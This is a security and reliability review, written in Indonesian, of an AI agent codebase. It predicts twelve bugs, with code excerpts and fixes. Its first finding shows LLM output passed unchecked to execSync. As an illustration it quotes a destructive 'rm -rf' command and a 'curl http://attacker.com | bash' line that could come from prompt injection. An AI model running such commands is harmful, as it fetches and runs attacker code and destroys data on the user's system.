# NEXUS AI — Prediksi Bug Generasi Berikutnya
**Tipe Dokumen:** Predictive Failure Analysis  
**Basis:** Source code review mendalam — setelah seluruh bug generasi pertama diselesaikan  
**Metodologi:** Setiap bug diprediksi dari pola kode aktual, bukan spekulasi  

> **Konteks:** Dokumen ini menjawab pertanyaan: *"Setelah semua bug R-01 s/d R-08 selesai, bug apa yang akan muncul selanjutnya?"*  
> Semua temuan di sini berakar pada kode yang sudah ada — bukan fitur baru.

---

## Klasifikasi

| Kode | Severity | Kategori |
|------|----------|----------|
| G2-01 | 🔴 Kritis | Logic Bug |
| G2-02 | 🔴 Kritis | Security |
| G2-03 | 🔴 Kritis | Data Integrity |
| G2-04 | 🔴 Kritis | Concurrency |
| G2-05 | 🟡 Sedang | Logic Bug |
| G2-06 | 🟡 Sedang | Performance |
| G2-07 | 🟡 Sedang | Logic Bug |
| G2-08 | 🟡 Sedang | Data Integrity |
| G2-09 | 🟡 Sedang | Logic Bug |
| G2-10 | 🟢 Minor | Reliability |
| G2-11 | 🟢 Minor | Correctness |
| G2-12 | 🟢 Minor | Logic |

---

## 🔴 Bug Kritis

---

### G2-01 — `COMMAND_EXEC` di Modifier Adalah Arbitrary Code Execution
**File:** `agent/core/Modifier.js`, baris ~45  
**Kode aktual:**
```javascript
case 'COMMAND_EXEC':
    const { execSync } = require('child_process');
    execSync(action.command, { cwd: this.rootPath, stdio: 'ignore' });
    return true;
```

**Mengapa ini akan meledak setelah R-01 selesai:**  
Setelah `spawnRealLaravel()` diimplementasikan dan pipeline benar-benar berjalan, `COMMAND_EXEC` akan digunakan aktif — untuk `composer install`, `artisan migrate`, dan seterusnya. Masalahnya: `action.command` adalah string bebas yang datang dari hasil LLM (`blueprintApp` → `generate_architecture`). LLM bisa menghasilkan command apa saja.

**Skenario kegagalan konkret:**
- LLM menghasilkan blueprint dengan `"command": "rm -rf vendor && composer install"` → vendor terhapus
- LLM menghasilkan `"command": "curl http://attacker.com | bash"` jika prompt injection berhasil
- `execSync` bersifat **synchronous dan blocking** — satu command yang hang (misal `composer install` lambat) memblokir seluruh event loop Node.js

**Fix:**
```javascript
// 1. Ganti execSync dengan spawn async
// 2. Tambahkan whitelist command yang diizinkan
const ALLOWED_COMMANDS = ['composer', 'php', 'npm', 'node'];
const cmdParts = action.command.split(' ');
if (!ALLOWED_COMMANDS.includes(cmdParts[0])) {
    throw new Error(`COMMAND_EXEC: Command "${cmdParts[0]}" not in whitelist`);
}
// 3. Gunakan spawn, bukan execSync
await spawnAsync(cmdParts[0], cmdParts.slice(1), { cwd: this.rootPath });
```

---

### G2-02 — `blueprintApp()` Mem-parse JSON dari LLM Tanpa Validasi Schema
**File:** `agent/core/NexusEngine.js`, metode `blueprintApp()`  
**Kode aktual:**
```javascript
const jsonMatch = response.match(/\{[\s\S]*\}/);
const blueprint = JSON.parse(jsonMatch ? jsonMatch[0] : response);
await fs.writeJson(blueprintPath, blueprint, { spaces: 2 });
```

**Mengapa ini akan meledak:**  
Setelah pipeline berjalan end-to-end, `blueprint` menjadi sumber kebenaran untuk seluruh `ImplementationPhase` — menentukan model apa yang dibuat, migration apa yang dijalankan, dan Livewire component apa yang di-generate. LLM tidak selalu menghasilkan struktur yang persis sama.

**Skenario kegagalan konkret:**
- LLM menambahkan key tambahan: `"dependencies": ["laravel/telescope"]` → `ImplementationPhase` mengiterasi key yang tidak dikenal, tidak error, tapi menghasilkan file-file aneh
- LLM menghasilkan `"models": "User"` (string, bukan array) → `for (const model of models)` throw `TypeError: models is not iterable`
- LLM menambahkan instruksi dalam natural language di dalam JSON: `"models": ["User", "IMPORTANT: also add Admin model"]` → file bernama `IMPORTANT: also add Admin model.php` dibuat di filesystem

**Fix:**
```javascript
const BLUEPRINT_SCHEMA = {
    required: ['project_name', 'models', 'migrations', 'livewire_components'],
    arrays: ['models', 'migrations', 'livewire_components'],
    strings: ['project_name']
};

function validateBlueprint(bp) {
    for (const key of BLUEPRINT_SCHEMA.required) {
        if (!(key in bp)) throw new Error(`Blueprint missing required key: ${key}`);
    }
    for (const key of BLUEPRINT_SCHEMA.arrays) {
        if (!Array.isArray(bp[key])) throw new Error(`Blueprint key "${key}" must be array`);
        // Sanitize: hanya izinkan nama yang valid (alphanumeric + underscore)
        bp[key] = bp[key].filter(v => typeof v === 'string' && /^[a-zA-Z_][a-zA-Z0-9_]*$/.test(v));
    }
    return bp;
}
```

---

### G2-03 — `wrapAsConditional()` Menyebabkan Collision Accumulation yang Tidak Pernah Diselesaikan
**File:** `agent/core/NexusEngine.js`, metode `wrapAsConditional()`  
**File terkait:** `agent/core/phases/KnowledgePhase.js`, metode `harvest()`

**Kode aktual:**
```javascript
// NexusEngine.js
wrapAsConditional(existing, added, context = 'Nexus Knowledge') {
    return `\n# NEXUS COLLISION RESOLVED: ${context}\nOpsi A:\n${existing}\nOpsi B:\n${added}\n`;
}

// KnowledgePhase.js - saat harvest menemukan file yang sudah ada:
const merged = this.engine.wrapAsConditional(oldContent, newContent, `Collision in ${file}...`);
await fs.writeFile(targetPath, merged);
```

**Mengapa ini akan meledak setelah knowledge loop aktif:**  
Setiap kali sandbox ke-2, ke-3, ke-4 di-harvest dan menemukan file knowledge yang sudah ada, file itu di-wrap lagi. Tidak ada mekanisme yang menyelesaikan collision ini secara otomatis. Setelah 10 sandbox, satu file knowledge bisa berisi 10 level nesting `Opsi A / Opsi B`.

**Skenario kegagalan konkret:**
- `Distiller.simplifyContent()` mencoba meringkas file yang isinya adalah collision block bersarang → LLM menghasilkan ringkasan tidak koheren
- `getSemanticTags()` mencari regex `METADATA` tapi terhalang oleh collision headers → semantic index tidak dibangun
- File knowledge tumbuh eksponensial: 100 sandbox × rata-rata 5 collision = file berukuran puluhan MB

**Fix:** Tambahkan collision resolver otomatis di `MemoryPipeline.processHarvestData()` — gunakan `DecisionEngine` yang sudah ada untuk memilih versi terbaik, atau merge secara semantic, bukan hanya append.

---

### G2-04 — `ParallelRunner` Membuang Semua Hasil Jika Satu Worker Throw
**File:** `agent/core/ParallelRunner.js`  
**Kode aktual:**
```javascript
static async run(items, taskFn, limit = 3) {
    const results = new Array(items.length);
    let index = 0;
    
    const worker = async () => {
        while (index < items.length) {
            const currentIndex = index++;
            try {
                results[currentIndex] = await taskFn(items[currentIndex]);
            } catch (e) {
                results[currentIndex] = e;
                throw e;  // ← INI MASALAHNYA
            }
        }
    };

    const workers = [];
    for (let i = 0; i < Math.min(limit, items.length); i++) {
        workers.push(worker());
    }

    await Promise.all(workers);  // ← Jika satu throw, semua dibatalkan
    return results;
}
```

**Mengapa ini akan meledak:**  
`AuditPhase` memanggil `ParallelRunner.run(specialists, ...)` dengan 6 specialist. Jika specialist ke-3 (misal `database-architect`) throw error karena project tidak punya database files, `Promise.all` akan **reject seluruh batch**. Hasil dari specialist 1 dan 2 yang sudah selesai dengan sukses dibuang begitu saja.

**Skenario konkret:**  
Project baru yang di-audit tidak punya `database/` folder. `database-architect` scanner throw "No migration files found". Seluruh audit phase gagal. Laporan dari `cyber-security`, `ux-engineer`, dan `seo-performance` yang sudah selesai tidak pernah tersimpan.

**Fix:**
```javascript
} catch (e) {
    results[currentIndex] = { error: e.message, severity: 'SCANNER_ERROR' };
    // Jangan throw — catat error tapi lanjut ke item berikutnya
}
```

---

## 🟡 Bug Sedang

---

### G2-05 — `blueprintApp()` Hanya Berjalan Jika README Mengandung Magic String
**File:** `agent/core/NexusEngine.js`  
**Kode aktual:**
```javascript
async blueprintApp(options = {}) {
    const readmePath = path.join(this.rootPath, 'README.md');
    if (!(await fs.pathExists(readmePath))) return;
    const readmeContent = await fs.readFile(readmePath, 'utf8');
    if (!readmeContent.includes('Generated by Nexus Autonomous Pipeline')) return;
    // ...
}
```

**Masalah:**  
`blueprintApp` hanya berjalan jika README mengandung string `'Generated by Nexus Autonomous Pipeline'`. Sandbox yang dibuat oleh `spawnRealLaravel()` (setelah R-01 difix) menggunakan template Laravel default yang **tidak mengandung string ini**. Artinya `blueprintApp` selalu di-skip → tidak ada blueprint → `ImplementationPhase` selalu skip karena `NEXUS_BLUEPRINT.json` tidak ada.

**Dampak:** Seluruh code generation phase tidak pernah berjalan pada project baru yang di-spawn.

**Fix:** Buat `spawnRealLaravel()` menulis README dengan magic string tersebut, atau ubah kondisi menjadi opt-in yang lebih fleksibel:
```javascript
const isNexusManaged = readmeContent.includes('Generated by Nexus') || 
                       await fs.pathExists(path.join(this.rootPath, 'NEXUS_BLUEPRINT.json'));
if (!isNexusManaged) return;
```

---

### G2-06 — `MemoryGovernor.ensureDirectories()` Dipanggil Synchronous di Constructor
**File:** `agent/core/MemoryGovernor.js`  
**Kode aktual:**
```javascript
constructor(rootPath) {
    this.rootPath = rootPath;
    this.memoryPath = path.join(this.rootPath, 'memory');
    this.ensureDirectories(); // ← synchronous fs call di constructor
}

ensureDirectories() {
    const dirs = ['raw', 'normalized', 'semantic', 'distilled', ...];
    dirs.forEach(dir => {
        fs.ensureDirSync(path.join(this.memoryPath, dir)); // ← blocking I/O
    });
}
```

**Masalah:**  
`NexusEngine` membuat `new MemoryGovernor(rootPath)` di constructor-nya. Ini memicu 7 `fs.ensureDirSync` secara synchronous di startup. Pada sistem dengan I/O lambat (NFS mount, Docker volume, Windows dengan antivirus), ini bisa memblokir thread utama 100-500ms per direktori.

Setelah R-01 difix dan 100 sandbox berjalan, ini menjadi bottleneck nyata — setiap sandbox spawn membuat `NexusEngine` baru (atau me-reset root path), dan setiap reset memicu 7 blocking I/O calls lagi.

**Fix:** Ubah `ensureDirectories()` menjadi async dan panggil di `initRedis()` atau buat `static async create(rootPath)` factory method.

---

### G2-07 — `Machinist.integrate()` Memodifikasi `NexusEngine.js` dengan String Replacement Rapuh
**File:** `agent/core/Machinist.js`  
**Kode aktual:**
```javascript
async integrate(name, type = 'auditor') {
    let content = await fs.readFile(this.enginePath, 'utf8');
    
    const requireAnchor = "const Distiller = require('./Distiller');";
    content = content.replace(
        requireAnchor,
        `${requireAnchor}\nconst ${name} = require('${relPath}');`
    );

    const initAnchor = "this.distiller = new Distiller(this.knowledgePath);";
    content = content.replace(
        initAnchor,
        `${initAnchor}\n        this.${instanceName} = new ${name}(this.rootPath);`
    );

    await fs.writeFile(this.enginePath, content);
}
```

**Masalah:**  
`Machinist.integrate()` memodifikasi source code `NexusEngine.js` hidup-hidup dengan mencari string literal `"const Distiller = require('./Distiller');"` sebagai anchor point. Ini akan gagal jika:
1. Developer menambahkan komentar setelah baris tersebut
2. Format file berubah (prettier/eslint auto-format mengubah spasi/quotes)
3. `integrate()` dipanggil dua kali untuk komponen berbeda → anchor pertama mungkin sudah berubah karena inject pertama

Setelah pipeline aktif dan Machinist mulai di-invoke untuk forging scanner baru, setiap call ke `integrate()` yang gagal meninggalkan `NexusEngine.js` dalam kondisi parsial-corrupt (anchor diganti tapi tidak semua inject berhasil).

**Fix:** Gunakan AST parser (seperti `@babel/parser` atau `acorn`) untuk modifikasi kode, bukan string replacement. Atau gunakan sentinel comment yang lebih robust: `// NEXUS_INJECT_REQUIRE` dan `// NEXUS_INJECT_INIT`.

---

### G2-08 — `MemoryPipeline.processHarvestData()` Menghapus Folder Harvest Setelah Proses
**File:** `agent/core/MemoryPipeline.js`  
**Kode aktual:**
```javascript
async processHarvestData() {
    // ... proses file harvest ...
    
    await fs.emptyDir(harvestPath);  // ← Hapus semua setelah proses
    console.log('   🧹 Harvest folder recycled.');
}
```

**Masalah:**  
`golden/harvest/` dikosongkan setelah setiap `processHarvestData()`. Jika proses di tengah-tengah crash (misalnya `versionedWrite()` gagal karena disk penuh), beberapa file sudah diproses dan dihapus dari harvest, tapi belum semua masuk ke HUB. Tidak ada cara untuk replay atau recovery. Data dari sandbox yang sudah di-destroy hilang permanen.

**Fix:** Gunakan move-then-delete, bukan copy-then-delete. Atau tambahkan transaction log: catat file yang sudah berhasil di-ingest sebelum `emptyDir`.

```javascript
const processedLog = path.join(harvestPath, '.processed.json');
const processed = [];
for (const file of files) {
    await this.versionedWrite(dest, content);
    processed.push(file);
    await fs.writeJson(processedLog, processed); // checkpoint
}
// Hanya hapus setelah semua berhasil tercatat
await fs.emptyDir(harvestPath);
```

---

### G2-09 — `Modifier.fileReplace()` Throw Jika Target Content Tidak Ditemukan (Tidak Di-handle)
**File:** `agent/core/Modifier.js`  
**Kode aktual:**
```javascript
async fileReplace(filePath, targetContent, replacementContent) {
    if (await fs.pathExists(filePath)) {
        let content = await fs.readFile(filePath, 'utf8');
        if (content.includes(targetContent)) {
            const newContent = content.replace(targetContent, replacementContent);
            await fs.writeFile(filePath, newContent);
            return true;
        }
        throw new Error(`Target content not found in file: ${filePath}`); // ← throw tanpa context
    }
    throw new Error(`File not found: ${filePath}`);
}
```

**Masalah:**  
`FILE_REPLACE` action dari `PlanningPhase` menggunakan content yang dihasilkan LLM sebagai `targetContent`. LLM mungkin menghasilkan konten yang sedikit berbeda dari file aktual (whitespace, newline, encoding). Akibatnya `fileReplace` selalu throw pada iterasi kedua ke atas karena file sudah dimodifikasi oleh iterasi pertama.

Di `ExecutionPhase`, error ini hanya di-catch dan dicatat sebagai `task.status = 'failed'` — lalu `continue` ke task berikutnya. Tidak ada rollback. Setelah 10 task, mungkin 6 berhasil dan 4 gagal diam-diam.

**Dampak nyata:** Developer melihat "✅ Execution phase completed" tapi setengah task tidak benar-benar dieksekusi.

**Fix:** `FILE_REPLACE` harus menjadi `FILE_PATCH` yang menggunakan diff/patch semantics, bukan exact string match. Atau tambahkan fuzzy matching dengan normalisasi whitespace sebelum cek `includes()`.

---

## 🟢 Bug Minor

---

### G2-10 — `LocalIntelligence` Circuit Breaker Tidak Pernah Kembali ke CLOSED
**File:** `agent/core/LocalIntelligence.js`  
**Kondisi:** Saat `failures >= threshold`, state berubah ke `OPEN`. Setelah `HALF_OPEN`, jika satu request berhasil, seharusnya kembali ke `CLOSED`. Jika implementasi HALF_OPEN tidak ada (atau hanya state label tanpa logika), circuit breaker hanya bisa OPEN permanen untuk satu session.

**Dampak:** Jika Ollama sempat timeout sekali di awal session, seluruh code generation diblokir untuk sisa session itu meskipun Ollama sudah kembali normal.

---

### G2-11 — `ensureEnv()` di Modifier Menggunakan Path yang Salah
**File:** `agent/core/Modifier.js`  
**Kode aktual:**
```javascript
async ensureEnv(filePath, key, value) {
    const envFile = path.resolve(this.rootPath, '.env');
    // ↑ Parameter `filePath` diabaikan sepenuhnya — selalu pakai rootPath/.env
```

**Masalah:** `action.target` dari task yang memanggil `ENV_ENSURE` sepenuhnya diabaikan. Jika task dimaksudkan untuk memodifikasi `.env` di dalam sandbox (bukan di rootPath), perubahan malah ditulis ke `.env` NEXUS engine itu sendiri.

---

### G2-12 — `getSemanticTags()` Regex Hanya Menangkap Satu Tag Block Per File
**File:** `agent/core/NexusEngine.js`  
**Kode aktual:**
```javascript
const match = content.match(/>\\s*\\*\\*METADATA.*\\*\\*:\\s*\\[(.*)\\]/i);
if (match) return match[1].split(',').map(t => t.trim().toLowerCase());
```

**Masalah:** `String.match()` tanpa flag `g` hanya menangkap kemunculan pertama. Setelah collision wrapping terjadi berulang kali (lihat G2-03), satu file bisa punya beberapa `METADATA` block. Hanya block pertama yang terbaca. Semantic index tidak lengkap.

---

## Ringkasan: Urutan Munculnya Bug

Setelah bug generasi pertama diselesaikan, urutan bug berikut yang paling mungkin muncul pertama kali berdasarkan jalur eksekusi:

```
nexus run (pertama kali setelah fix)
    │
    ├─ blueprintApp() ──────────────── [G2-05] magic string → blueprint tidak dibuat
    │
    ├─ AuditPhase (6 specialists)
    │   └─ ParallelRunner ───────────── [G2-04] satu scanner error → semua dibatalkan
    │
    ├─ ImplementationPhase
    │   └─ blueprintApp() skip
    │       └─ LLM generate JSON ──── [G2-02] schema tidak valid → TypeError di loop
    │
    ├─ ExecutionPhase
    │   └─ COMMAND_EXEC ─────────────── [G2-01] blocking execSync, no whitelist
    │   └─ FILE_REPLACE ─────────────── [G2-09] target content tidak ditemukan
    │
    └─ KnowledgePhase (harvest ke-2 dst)
        └─ collision ─────────────────── [G2-03] wrapAsConditional bertumpuk
        └─ emptyDir crash ───────────── [G2-08] data hilang tanpa recovery
```

**Bug yang paling berbahaya untuk diselesaikan lebih dulu (sebelum G2-01):** G2-04, karena ia menyembunyikan semua bug lain — jika satu scanner gagal, kamu tidak akan pernah tahu scanner mana yang berhasil dan mana yang tidak.

---

*Analisis ini berdasarkan pembacaan langsung file: `Modifier.js`, `NexusEngine.js` (blueprintApp, wrapAsConditional), `ParallelRunner.js`, `MemoryPipeline.js`, `KnowledgePhase.js`, `Machinist.js` (integrate), `LocalIntelligence.js`, `MemoryGovernor.js`.*
